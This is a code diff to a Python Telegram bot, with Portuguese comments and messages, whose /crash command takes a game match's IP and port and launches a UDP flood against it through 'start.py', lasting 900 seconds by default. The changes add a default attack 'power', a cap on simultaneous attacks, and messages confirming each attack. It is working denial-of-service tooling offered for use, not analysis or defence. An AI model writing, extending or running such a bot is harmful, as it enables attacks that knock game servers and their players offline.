@@ -147,12 +147,14 @@ def crash_server(message):
 
     comando = message.text.split()
     if len(comando) < 2:
-        bot.send_message(message.chat.id, "Uso correto: /crash <IP da partida> [tempo]")
+        bot.send_message(message.chat.id, "Uso correto: /crash <IP da partida>")
         return
 
     ip_porta = comando[1]
     tempo = 900  # Padrão 900 segundos
+    potencia = 10  # Padrão 10
 
+    # Verificar se o comando inclui o tempo (não é necessário, pois o padrão já é 900)
     if len(comando) == 3:
         try:
             tempo = int(comando[2])
@@ -160,14 +162,22 @@ def crash_server(message):
             bot.send_message(message.chat.id, "Por favor, insira um tempo válido.")
             return
 
+    # Verificar se o IP já tem um ataque em andamento
     if ip_porta in processos:
         bot.send_message(message.chat.id, f"Já existe um ataque em andamento para {ip_porta}.")
         return
 
-    # Gerenciar ataque contínuo
-    processo = subprocess.Popen(["python3", "-c", f"import time; {ataque_continuo.__code__}"])
+    # Gerenciar o limite de ataques simultâneos
+    if len(processos) >= MAX_ATTACKS:
+        oldest_process = list(processos.values())[0]
+        oldest_process.terminate()
+        del processos[list(processos.keys())[0]]
+
+    # Enviar comando no formato correto com 10 e 900 como padrão
+    comando_ataque = ["python3", "start.py", "UDP", ip_porta, str(potencia), str(tempo)]
+    processo = subprocess.Popen(comando_ataque)
     processos[ip_porta] = processo
-    bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} por {tempo} segundos.")
+    bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} com potência {potencia} por {tempo} segundos.")
 
 # Comando /meuid
 @bot.message_handler(commands=['meuid'])
@@ -207,7 +217,8 @@ def admin_commands(message):
             bot.send_message(message.chat.id, f"Usuário {usuario_id} removido com sucesso.")
         else:
             bot.send_message(message.chat.id, "Usuário não encontrado na lista de autorizados.")
-            # Comando /listusers
+
+# Comando /listusers
 @bot.message_handler(commands=['listusers'])
 def list_users(message):
     if message.from_user.id != SEU_ID_TELEGRAM:
